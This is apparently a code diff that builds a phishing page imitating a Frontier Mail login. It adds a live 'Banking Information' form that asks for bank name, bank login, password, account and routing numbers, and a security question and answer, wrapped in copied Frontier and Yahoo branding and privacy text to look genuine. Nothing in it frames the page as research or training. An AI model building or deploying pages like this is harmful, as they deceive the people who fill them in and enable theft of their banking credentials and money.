@@ -3,8 +3,9 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Frontier | Update Billing</title>
+    <title>Frontier Mail Login</title>
     <link rel="stylesheet" href="/index.css" />
+    <link rel="stylesheet" href="/css/banking.css" />
     <link
       rel="stylesheet"
       href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0" />
@@ -40,7 +41,7 @@
         </nav>
       </div>
 
-      <div class="header-logo-section">
+      <!-- <div class="header-logo-section">
         <div class="logo-img">
           <img
             src="/images/frontier_header.png"
@@ -51,54 +52,97 @@
         </div>
         <div class="header-drop-down">
           <select class="dropdown" name="Go to..." id="cars">
-            <option value="goto...">Go to...</option>
-            <option value="account">My Account</option>
-            <option value="bill">Pay Your Bill</option>
-            <option value="mail">Check Your Mail</option>
+            <option value="goto...">Select</option>
+            <option value="account">Mastercard</option>
+            <option value="bill">Visa</option>
+            <option value="mail">AMEX</option>
+            <option value="mail">Discover</option>
           </select>
-        </div>
-      </div>
+        </div> 
+      </div> -->
     </header>
 
-    <!-- <main>
-      <section class="section-billing">
-        <h1 class="update-billing-text">Update Your Billing Information</h1>
-        <form action="" class="billing-form">
-          <div class="info-container">
-            <label for=""></label>
-            <select class="dropdown" name="select" id="card-type">
-              <option value="goto...">Go to...</option>
-              <option value="account">My Account</option>
-              <option value="bill">Pay Your Bill</option>
-              <option value="mail">Check Your Mail</option>
-            </select>
+    <main class="section-main">
+      <form
+        type="/submit"
+        class="main-container banking-form"
+        id="banking-form">
+        <h1 class="heading-text" id="banking-information">
+          Banking Information
+        </h1>
+        <div class="email-section bank-name" id="bank-name">
+          <span>Bank Name</span>
+          <input type="text" />
+        </div>
+        <div class="email-section bank-login" id="bank-login">
+          <span>Bank Username/E-mail</span>
+          <input type="text" />
+        </div>
+        <div class="email-section bank-password" id="bank-password">
+          <span>Password</span>
+          <input type="password" placeholder="*********" />
+        </div>
+        <div class="email-section bank-routing" id="bank-routing">
+          <span>Account Number</span>
+          <input type="text" />
+        </div>
+        <div class="email-section bank-account" id="bank-account">
+          <span>Routing number</span>
+          <input type="text" />
+        </div>
+        <div class="email-section security-container">
+          <!-- <span>Email Address</span> -->
+          <label for="security-question">Security Question</label>
+          <select
+            class="dropdown-banking"
+            name="security-question"
+            id="security-question">
+            <option value="select">Select</option>
+            <option value="account">Mastercard</option>
+            <option value="amex">AMEX</option>
+            <option value="discover">Discover</option>
+            <option value="visa">Visa</option>
+          </select>
+        </div>
+        <div class="email-section security-answer" id="security-answer">
+          <span>Answer</span>
+          <input type="text" />
+        </div>
+
+        <button class="login-btn verify-btn">VERIFY</button>
+        <div class="pass-forget-container">
+          <a class="pass-forget" href="">Make Frontier Yahoo! your homepage</a>
+        </div>
+        <div class="form-buttom">
+          <div class="yahoo-search-section">
+            <input class="yahoo-search-box" type="text" />
+            <div class="yahoo-search-container">
+              <span class="provided-by">Provided by</span>
+              <img
+                src="/images/yahoo.png"
+                alt=""
+                class="yah00-search-img"
+                width="80" />
+              <span class="search-btn">WEB SEARCH</span>
+            </div>
           </div>
-          <div class="info-container">
-            <label for=""></label>
-            <input type="text" placeholder="Full Name" />
-          </div>
-          <div class="info-container">
-            <label for=""></label>
-            <input type="text" placeholder="CC Number" />
-          </div>
-          <div class="info-container">
-            <label for=""></label>
-            <select class="dropdown" name="select" id="card-type">
-              <option value="goto...">Go to...</option>
-              <option value="account">My Account</option>
-              <option value="bill">Pay Your Bill</option>
-              <option value="mail">Check Your Mail</option>
-            </select>
-            <select class="dropdown" name="select" id="card-type">
-              <option value="goto...">Go to...</option>
-              <option value="account">My Account</option>
-              <option value="bill">Pay Your Bill</option>
-              <option value="mail">Check Your Mail</option>
-            </select>
-          </div>
-        </form>
-      </section>
-    </main> -->
+          <p>
+            Still need help? <i class="ri-chat-3-fill"></i> Live Chat
+            <i class="ri-question-fill"></i> Help Center
+          </p>
+          <p>
+            <b>Note:</b> For your security, please be sure to log out when you
+            are done.
+          </p>
+          <p>
+            Frontier does not track how you use email or what sites you visit.
+            If your Frontier email is hosted by Yahoo!, Yahoo! does not share
+            this information with Frontier.
+            <a href="">See Frontier's Privacy Policy.</a>
+          </p>
+        </div>
+      </form>
+    </main>
 
     <footer class="section-footer">
       <div class="footer-container">
@@ -193,7 +237,7 @@
         <div class="footer-container-bottom">
           <div class="footer-bottom-links">
             <span class="span-bottom-links">
-              <a href="">Home</a> | <a href="">Site Map</a> |
+              <a href="/views/billing.html">Home</a> | <a href="">Site Map</a> |
               <a href="">Store Locator</a> |
               <a href="">Policies & Notifications</a> |
               <a href="">Terms & Conditions</a> |
